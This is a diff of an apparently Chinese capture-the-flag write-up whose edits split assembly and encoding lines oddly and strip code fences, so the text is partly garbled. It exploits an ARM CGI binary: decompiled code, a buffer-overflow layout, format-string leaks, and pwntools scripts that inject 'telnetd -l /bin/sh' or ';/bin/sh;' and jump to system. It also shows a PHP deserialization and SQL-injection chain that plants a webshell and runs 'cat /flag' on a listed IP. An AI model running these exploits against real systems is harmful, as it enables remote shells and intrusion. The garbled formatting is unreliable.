@@ -134,26 +134,46 @@ int __fastcall main(int a1, char **a2, char **a3)
 }
 
 主要环境变量为：
-.rodata:00012824                                         ; "SERVER_SOFTWARE"
-.rodata:00012828                 DCD aServerName         ; "SERVER_NAME"
-.rodata:0001282C                 DCD aGatewayInterfa     ; "GATEWAY_INTERFACE"
-.rodata:00012830                 DCD aServerProtocol     ; "SERVER_PROTOCOL"
-.rodata:00012834                 DCD aServerPort         ; "SERVER_PORT"
-.rodata:00012838                 DCD aRequestMethod      ; "REQUEST_METHOD"
-.rodata:0001283C                 DCD aPathInfo           ; "PATH_INFO"
-.rodata:00012840                 DCD aPathTranslated     ; "PATH_TRANSLATED"
-.rodata:00012844                 DCD aScriptName         ; "SCRIPT_NAME"
-.rodata:00012848                 DCD aQueryString        ; "QUERY_STRING"
-.rodata:0001284C                 DCD aRemoteHost         ; "REMOTE_HOST"
-.rodata:00012850                 DCD aRemoteAddr         ; "REMOTE_ADDR"
-.rodata:00012854                 DCD aAuthType           ; "AUTH_TYPE"
-.rodata:00012858                 DCD aRemoteUser         ; "REMOTE_USER"
-.rodata:0001285C                 DCD aRemoteIdent        ; "REMOTE_IDENT"
-.rodata:00012860                 DCD aContentType        ; "CONTENT_TYPE"
-.rodata:00012864                 DCD aContentLength      ; "CONTENT_LENGTH"
-.rodata:00012868                 DCD aHttpAccept         ; "HTTP_ACCEPT"
-.rodata:0001286C                 DCD aHttpUserAgent      ; "HTTP_USER_AGENT"
-.rodata:00012870                 DCD aHttpCookies        ; "HTTP_COOKIES"
+.rodata:
+00012824                                         ; "SERVER_SOFTWARE"
+.rodata:
+00012828                 DCD aServerName         ; "SERVER_NAME"
+.rodata:
+0001282C                 DCD aGatewayInterfa     ; "GATEWAY_INTERFACE"
+.rodata:
+00012830                 DCD aServerProtocol     ; "SERVER_PROTOCOL"
+.rodata:
+00012834                 DCD aServerPort         ; "SERVER_PORT"
+.rodata:
+00012838                 DCD aRequestMethod      ; "REQUEST_METHOD"
+.rodata:
+0001283C                 DCD aPathInfo           ; "PATH_INFO"
+.rodata:
+00012840                 DCD aPathTranslated     ; "PATH_TRANSLATED"
+.rodata:
+00012844                 DCD aScriptName         ; "SCRIPT_NAME"
+.rodata:
+00012848                 DCD aQueryString        ; "QUERY_STRING"
+.rodata:
+0001284C                 DCD aRemoteHost         ; "REMOTE_HOST"
+.rodata:
+00012850                 DCD aRemoteAddr         ; "REMOTE_ADDR"
+.rodata:
+00012854                 DCD aAuthType           ; "AUTH_TYPE"
+.rodata:
+00012858                 DCD aRemoteUser         ; "REMOTE_USER"
+.rodata:
+0001285C                 DCD aRemoteIdent        ; "REMOTE_IDENT"
+.rodata:
+00012860                 DCD aContentType        ; "CONTENT_TYPE"
+.rodata:
+00012864                 DCD aContentLength      ; "CONTENT_LENGTH"
+.rodata:
+00012868                 DCD aHttpAccept         ; "HTTP_ACCEPT"
+.rodata:
+0001286C                 DCD aHttpUserAgent      ; "HTTP_USER_AGENT"
+.rodata:
+00012870                 DCD aHttpCookies        ; "HTTP_COOKIES"
 
 /../tmp/session -> /var/www/../tmp/session -> /var/tmp/session
 
@@ -274,21 +294,30 @@ payload ="*#$^(length_part1)(length_part2)(length_part3)(content_length_part1)(
 n = lenth_part3 + 4 * (length_part2 + 2 * length_part1) #3315
 payload_length = content_length_part2 + 2 * content_length_part1 # 0x2fd
 
-.text:000109D4                 SUB     R3, R11, #-s
-.text:000109D8                 MOV     R0, R3          ; command
-.text:000109DC                 BL      system
+.text:
+000109D4                 SUB     R3, R11, #-s
+.text:
+000109D8                 MOV     R0, R3          ; command
+.text:
+000109DC                 BL      system
 
-.text:00010B24                 LDR     R2, [R11,#n]    ; n
-.text:00010B28                 SUB     R3, R11, #-dest
-.text:00010B2C                 LDR     R1, [R11,#src]  ; src
-.text:00010B30                 MOV     R0, R3          ; dest
-.text:00010B34                 BL      strncpy
+.text:
+00010B24                 LDR     R2, [R11,#n]    ; n
+.text:
+00010B28                 SUB     R3, R11, #-dest
+.text:
+00010B2C                 LDR     R1, [R11,#src]  ; src
+.text:
+00010B30                 MOV     R0, R3          ; dest
+.text:
+00010B34                 BL      strncpy
  MOV     R0, R3          ; dest
 执行过后 R0中应该还是是第二段payload
 因此我们返回到0x000109DC 直接Call system估计就行
 
 #!/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 
 from pwn import *
 import requests as rq
@@ -360,7 +389,8 @@ export QUERY_STRING=name=F0und
 qemu-arm -L /usr/arm-linux-gnueabi -g 1234 63.cgi
 
 #!/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 
 from pwn import *
 import requests as rq
@@ -386,7 +416,8 @@ for i in range(2,6):
 echo "name=F0und" | qemu-arm -L /usr/arm-linux-gnueabi 63.cgi
 
 #!/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 from pwn import *
 
 commend = "& telnetd -l /bin/sh -p 6789 ;"
@@ -416,19 +447,30 @@ log.info("payload_length: "+str(len(payload))) #content_length 1452
 # break point 0x00010C84 
 # 0x00010B34
 
-.text:00010B90                 SUB     R3, R3, #4
-.text:00010B94                 LDR     R1, =aPing      ; "ping"
-.text:00010B98                 MOV     R0, R3          ; haystack
-.text:00010B9C                 BL      strstr
-.text:00010BA0                 MOV     R3, R0
-.text:00010BA4                 CMP     R3, #0
-.text:00010BA8                 BEQ     loc_10CCC
-.text:00010BAC                 LDR     R0, =a2021226   ; "20.21.2.26"
-.text:00010BB0                 BL      sub_109B0
-.text:00010BB4                 B       loc_10CCC
+.text:
+00010B90                 SUB     R3, R3, #4
+.text:
+00010B94                 LDR     R1, =aPing      ; "ping"
+.text:
+00010B98                 MOV     R0, R3          ; haystack
+.text:
+00010B9C                 BL      strstr
+.text:
+00010BA0                 MOV     R3, R0
+.text:
+00010BA4                 CMP     R3, #0
+.text:
+00010BA8                 BEQ     loc_10CCC
+.text:
+00010BAC                 LDR     R0, =a2021226   ; "20.21.2.26"
+.text:
+00010BB0                 BL      sub_109B0
+.text:
+00010BB4                 B       loc_10CCC
 
 #!/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 from pwn import *
 #remote
 #commend = "; telnetd -l /bin/sh -p 6789 ;"
@@ -458,7 +500,8 @@ log.info("strncpy_n_length: "+hex(payload_length))
 log.info("payload_length: "+str(len(payload)))
 
 #!/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 
 from pwn import *
 import requests as rq
@@ -593,23 +636,8 @@ class cache
 }
 $c = new cache();
 echo bin2hex(serialize($c));
-```
-
-
-
-```
 /api.php?c=call&data=%7b%22m_picplayer%22%3a%7b%22type_id%22%3a%22sql%22%2c%22cache%22%3a%22false%22%2c%22sqlinfo%22%3a%22INSERT%20INTO%20qinggan_fields(%60id%60%2c%60ftype%60%2c%60title%60%2c%60identifier%60%2c%60field_type%60%2c%60note%60%2c%60form_type%60%2c%60form_style%60%2c%60format%60%2c%60content%60%2c%60taxis%60%2c%60ext%60%2c%60is_front%60%2c%60search%60%2c%60search_separator%60%2c%60form_class%60)%20VALUES(1%2c'21'%2c'text'%2c'pic'%2c'int'%2c'test'%2c'upload'%2c'test'%2c'safe'%2c'test'%2c20%2c0x4f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a35363a227068703a2f2f66696c7465722f77726974653d636f6e766572742e6261736536342d6465636f64652f7265736f757263653d736f6d6e7573223b733a31313a22002a006b65795f6c697374223b733a34323a22616150443977614841675a585a686243676b58314a465556564655315262496d456958536b37507a343d223b733a393a22002a00666f6c646572223b733a303a22223b7d%2c0%2c0%2c'test'%2c'test')%3b%22%7d%7d
-```
-
-
-
-```
 /api.php?c=call&data=%7b%22m_picplayer%22%3a%7b%22type_id%22%3a%22fields%22%2c%22cache%22%3a%22false%22%2c%22site%22%3a1%2c%22pid%22%3a41%7d%7d最后去访问http://114.5.18.20/somnus.php?a=system(%27cat%20/flag%27);即可
-```
-
-
-
-```
 int __fastcall main(int a1, char **a2, char **a3)
 {
   char *v3; // r0
@@ -656,11 +684,6 @@ int __fastcall main(int a1, char **a2, char **a3)
   printf("CONTENT_LENGTH not supported now !");
   return -1;
 }
-```
-
-
-
-```
 int __fastcall main(int a1, char **a2, char **a3)
 {
   char *v3; // r0
@@ -705,11 +728,6 @@ int __fastcall main(int a1, char **a2, char **a3)
   }
   return 0;
 }
-```
-
-
-
-```
 int __fastcall main(int a1, char **a2, char **a3)
 {
   _DWORD *v4; // [sp+Ch] [bp-8h]
@@ -722,45 +740,50 @@ int __fastcall main(int a1, char **a2, char **a3)
 }
 
 主要环境变量为：
-.rodata:00012824                                         ; "SERVER_SOFTWARE"
-.rodata:00012828                 DCD aServerName         ; "SERVER_NAME"
-.rodata:0001282C                 DCD aGatewayInterfa     ; "GATEWAY_INTERFACE"
-.rodata:00012830                 DCD aServerProtocol     ; "SERVER_PROTOCOL"
-.rodata:00012834                 DCD aServerPort         ; "SERVER_PORT"
-.rodata:00012838                 DCD aRequestMethod      ; "REQUEST_METHOD"
-.rodata:0001283C                 DCD aPathInfo           ; "PATH_INFO"
-.rodata:00012840                 DCD aPathTranslated     ; "PATH_TRANSLATED"
-.rodata:00012844                 DCD aScriptName         ; "SCRIPT_NAME"
-.rodata:00012848                 DCD aQueryString        ; "QUERY_STRING"
-.rodata:0001284C                 DCD aRemoteHost         ; "REMOTE_HOST"
-.rodata:00012850                 DCD aRemoteAddr         ; "REMOTE_ADDR"
-.rodata:00012854                 DCD aAuthType           ; "AUTH_TYPE"
-.rodata:00012858                 DCD aRemoteUser         ; "REMOTE_USER"
-.rodata:0001285C                 DCD aRemoteIdent        ; "REMOTE_IDENT"
-.rodata:00012860                 DCD aContentType        ; "CONTENT_TYPE"
-.rodata:00012864                 DCD aContentLength      ; "CONTENT_LENGTH"
-.rodata:00012868                 DCD aHttpAccept         ; "HTTP_ACCEPT"
-.rodata:0001286C                 DCD aHttpUserAgent      ; "HTTP_USER_AGENT"
-.rodata:00012870                 DCD aHttpCookies        ; "HTTP_COOKIES"
-```
-
-
-
-```
+.rodata:
+00012824                                         ; "SERVER_SOFTWARE"
+.rodata:
+00012828                 DCD aServerName         ; "SERVER_NAME"
+.rodata:
+0001282C                 DCD aGatewayInterfa     ; "GATEWAY_INTERFACE"
+.rodata:
+00012830                 DCD aServerProtocol     ; "SERVER_PROTOCOL"
+.rodata:
+00012834                 DCD aServerPort         ; "SERVER_PORT"
+.rodata:
+00012838                 DCD aRequestMethod      ; "REQUEST_METHOD"
+.rodata:
+0001283C                 DCD aPathInfo           ; "PATH_INFO"
+.rodata:
+00012840                 DCD aPathTranslated     ; "PATH_TRANSLATED"
+.rodata:
+00012844                 DCD aScriptName         ; "SCRIPT_NAME"
+.rodata:
+00012848                 DCD aQueryString        ; "QUERY_STRING"
+.rodata:
+0001284C                 DCD aRemoteHost         ; "REMOTE_HOST"
+.rodata:
+00012850                 DCD aRemoteAddr         ; "REMOTE_ADDR"
+.rodata:
+00012854                 DCD aAuthType           ; "AUTH_TYPE"
+.rodata:
+00012858                 DCD aRemoteUser         ; "REMOTE_USER"
+.rodata:
+0001285C                 DCD aRemoteIdent        ; "REMOTE_IDENT"
+.rodata:
+00012860                 DCD aContentType        ; "CONTENT_TYPE"
+.rodata:
+00012864                 DCD aContentLength      ; "CONTENT_LENGTH"
+.rodata:
+00012868                 DCD aHttpAccept         ; "HTTP_ACCEPT"
+.rodata:
+0001286C                 DCD aHttpUserAgent      ; "HTTP_USER_AGENT"
+.rodata:
+00012870                 DCD aHttpCookies        ; "HTTP_COOKIES"
 /../tmp/session -> /var/www/../tmp/session -> /var/tmp/session
-```
-
-
-
-```
 index.cgi 主要处理环境变量
 55.cgi 漏洞点
 63.cgi Welcome page
-```
-
-
-
-```
 content_length 不受限
 char *__fastcall sub_109E0(char *result)
 {
@@ -775,11 +798,6 @@ char *__fastcall sub_109E0(char *result)
   }
   return result;
 }
-```
-
-
-
-```
 int sub_108C8()
 {
   char s[20]; // [sp+0h] [bp-54h] BYREF
@@ -811,11 +829,6 @@ int sub_108C8()
   }
   return v7;
 }
-```
-
-
-
-```
 0 < content_length < 0xcf4
 char *__fastcall sub_10B48(char *result)
 {
@@ -863,11 +876,6 @@ char *__fastcall sub_10B48(char *result)
   }
   return result;
 }
-```
-
-
-
-```
 假设输入
 *#$^AAAAAAAAAA
 -> v9 = 0x41
@@ -876,11 +884,6 @@ n = 0x41+4* v8 // 确定整个包的长度，因此要尽量确保他比较
 v6 = 0x41
 v5 = content[8] + 2 * v6 // payload的位置,要尽量精确
 v3 = &[v5-77]
-```
-
-
-
-```
 length_part1 = p8(0xff)
 length_part2 = p8(0xff)
 length_part3 = p8(0xff)
@@ -889,34 +892,28 @@ content_length_part2 = p8(0xff)
 payload ="*#$^(length_part1)(length_part2)(length_part3)(content_length_part1)(content_length_part2)('A'*(0x2fd - 77 - 5))+('B'*0x2f4 + payload)"
 n = lenth_part3 + 4 * (length_part2 + 2 * length_part1) #3315
 payload_length = content_length_part2 + 2 * content_length_part1 # 0x2fd
-```
-
-
-
-```
-.text:000109D4                 SUB     R3, R11, #-s
-.text:000109D8                 MOV     R0, R3          ; command
-.text:000109DC                 BL      system
-```
-
-
-
-```
-.text:00010B24                 LDR     R2, [R11,#n]    ; n
-.text:00010B28                 SUB     R3, R11, #-dest
-.text:00010B2C                 LDR     R1, [R11,#src]  ; src
-.text:00010B30                 MOV     R0, R3          ; dest
-.text:00010B34                 BL      strncpy
+.text:
+000109D4                 SUB     R3, R11, #-s
+.text:
+000109D8                 MOV     R0, R3          ; command
+.text:
+000109DC                 BL      system
+.text:
+00010B24                 LDR     R2, [R11,#n]    ; n
+.text:
+00010B28                 SUB     R3, R11, #-dest
+.text:
+00010B2C                 LDR     R1, [R11,#src]  ; src
+.text:
+00010B30                 MOV     R0, R3          ; dest
+.text:
+00010B34                 BL      strncpy
  MOV     R0, R3          ; dest
 执行过后 R0中应该还是是第二段payload
 因此我们返回到0x000109DC 直接Call system估计就行
-```
-
-
-
-```
 #!/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 
 from pwn import *
 import requests as rq
@@ -965,11 +962,6 @@ log.info("package_length: "+hex(n))
 log.info("strncpy_n_length: "+hex(payload_length))
 
 rq.post(request_url,headers = headers ,data=payload)
-```
-
-
-
-```
 假设我们栈情况：
   char s[20]; // [sp+0h] [bp-54h] BYREF //我们要泄漏的东西 长度为0x10
   char s2[20]; // [sp+14h] [bp-40h] BYREF
@@ -982,11 +974,6 @@ rq.post(request_url,headers = headers ,data=payload)
   我们先泄漏一下haystack来进行测试我们的计算：
   haystack = (0x2c - 0x14) / 4 = 6
   因此format 应该等于 7+6 = 13
-```
-
-
-
-```
 export HTTP_COOKIES=uuid=%2$p // 注意转义$
 export REQUEST_METHOD=POST
 export CONTENT_TYPE=application/x-www-form-urlencoded
@@ -994,13 +981,9 @@ export CONTENT_LENGTH=10
 export QUERY_STRING=name=F0und
 
 qemu-arm -L /usr/arm-linux-gnueabi -g 1234 63.cgi
-```
-
-
-
-```
 #!/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 
 from pwn import *
 import requests as rq
@@ -1022,19 +1005,10 @@ def leak_session(format):
 
 for i in range(2,6):
   leak_session("%"+str(i)+"$p")
-```
-
-
-
-```
 echo "name=F0und" | qemu-arm -L /usr/arm-linux-gnueabi 63.cgi
-```
-
-
-
-```
 #!/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 from pwn import *
 
 commend = "& telnetd -l /bin/sh -p 6789 ;"
@@ -1063,31 +1037,32 @@ log.info("strncpy_n_length: "+hex(payload_length))
 log.info("payload_length: "+str(len(payload))) #content_length 1452
 # break point 0x00010C84 
 # 0x00010B34
-```
-
-
-
-```
-.text:00010B90                 SUB     R3, R3, #4
-.text:00010B94                 LDR     R1, =aPing      ; "ping"
-.text:00010B98                 MOV     R0, R3          ; haystack
-.text:00010B9C                 BL      strstr
-.text:00010BA0                 MOV     R3, R0
-.text:00010BA4                 CMP     R3, #0
-.text:00010BA8                 BEQ     loc_10CCC
-.text:00010BAC                 LDR     R0, =a2021226   ; "20.21.2.26"
-.text:00010BB0                 BL      sub_109B0
-.text:00010BB4                 B       loc_10CCC
-```
-
-
-
-```
+.text:
+00010B90                 SUB     R3, R3, #4
+.text:
+00010B94                 LDR     R1, =aPing      ; "ping"
+.text:
+00010B98                 MOV     R0, R3          ; haystack
+.text:
+00010B9C                 BL      strstr
+.text:
+00010BA0                 MOV     R3, R0
+.text:
+00010BA4                 CMP     R3, #0
+.text:
+00010BA8                 BEQ     loc_10CCC
+.text:
+00010BAC                 LDR     R0, =a2021226   ; "20.21.2.26"
+.text:
+00010BB0                 BL      sub_109B0
+.text:
+00010BB4                 B       loc_10CCC
 #!/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 from pwn import *
-#remote
-#commend = "; telnetd -l /bin/sh -p 6789 ;"
+    #remote
+    #commend = "; telnetd -l /bin/sh -p 6789 ;"
 commend = ";/bin/sh;"
 
 system = 0x00010BB0
@@ -1112,13 +1087,9 @@ f.close()
 log.info("package_length: "+hex(n))
 log.info("strncpy_n_length: "+hex(payload_length))
 log.info("payload_length: "+str(len(payload)))
-```
-
-
-
-```
 #!/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 
 from pwn import *
 import requests as rq
@@ -1172,11 +1143,6 @@ log.info("package_length: "+hex(n))
 log.info("strncpy_n_length: "+hex(payload_length))
 log.info("payload_length: "+str(len(payload)))
 rq.post(request_url,headers = headers ,data=payload)
-```
-
-
-
-```
 #!/usr/bin/python
 
 import requests
